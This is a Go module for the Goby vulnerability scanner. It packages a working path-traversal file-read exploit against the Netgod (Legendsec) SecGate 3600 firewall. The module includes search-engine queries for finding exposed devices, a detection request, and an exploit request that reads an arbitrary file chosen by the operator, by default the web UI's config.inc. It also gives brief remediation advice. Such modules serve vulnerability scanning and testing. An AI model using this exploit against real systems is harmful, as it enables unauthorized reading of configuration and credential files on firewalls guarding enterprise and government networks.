package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Netgod SecGate 3600 Firewall sys_export_conf_local_save File Read Vulnerability",
    "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file reading vulnerability in the Netgod SecGate 3600 firewall, which allows attackers to obtain sensitive information from the server.</p>",
    "Product": "legendsec-Secgate-3600-firewall",
    "Homepage": "https://www.legendsec.com/newsec.php?up=2&cid=63",
    "DisclosureDate": "2023-01-30",
    "Author": "1243099890@qq.com",
    "FofaQuery": "title=\"网神SecGate 3600防火墙\"",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\"",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in the Netgod SecGate 3600 firewall, which allows attackers to obtain sensitive information from the server.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "/secgate/webui/config.inc",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?g=sys_export_conf_local_save&file_name=../../../../secgate/webui/modules/system/import_export.mds",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sys_export_conf_local_save",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?g=sys_export_conf_local_save&file_name=../../../../{{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "网神SecGate 3600防火墙 sys_export_conf_local_save 文件读取漏洞",
            "Product": "网神SecGate-3600防火墙",
            "Description": "<p>网神SecGate 3600防火墙是基于状态检测包过滤和应用级代理的复合型硬件防火墙，是专门面向大中型企业、政府、军队、高校等用户开发的新一代专业防火墙设备，支持外部攻击防范、内网安全、网络访问权限控制、网络流量监控和带宽管理、动态路由、网页内容过滤、邮件内容过滤、IP冲突检测等功能，能够有效地保证网络的安全；产品提供灵活的网络路由/桥接能力，支持策略路由，多出口链路聚合；提供多种智能分析和管理手段，支持邮件告警，支持日志审计，提供全面的网络管理监控，协助网络管理员完成网络的安全管理。</p><p>网神SecGate 3600防火墙存在文件读取漏洞，攻击者可以通过该漏洞获取服务器敏感信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>网神SecGate 3600防火墙存在文件读取漏洞，攻击者可以通过该漏洞获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Netgod SecGate 3600 Firewall sys_export_conf_local_save File Read Vulnerability",
            "Product": "legendsec-Secgate-3600-firewall",
            "Description": "<p>Netgod SecGate 3600 firewall is a composite hardware firewall based on status detection packet filtering and application level agents. It is a new generation of professional firewall equipment specially developed for large and medium-sized enterprises, governments, military, universities and other users. It supports external attack prevention, internal network security, network access control, network traffic monitoring and bandwidth management, dynamic routing, web content filtering, email content filtering, IP conflict detection and other functions, It can effectively ensure the security of the network; The product provides flexible network routing/bridging capabilities, supports policy routing and multi outlet link aggregation; It provides a variety of intelligent analysis and management methods, supports email alarm, supports log audit, provides comprehensive network management monitoring, and assists network administrators in completing network security management.</p><p>There is a file reading vulnerability in the Netgod SecGate 3600 firewall, which allows attackers to obtain sensitive information from the server.<br></p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is a file reading vulnerability in the Netgod SecGate 3600 firewall, which allows attackers to obtain sensitive information from the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}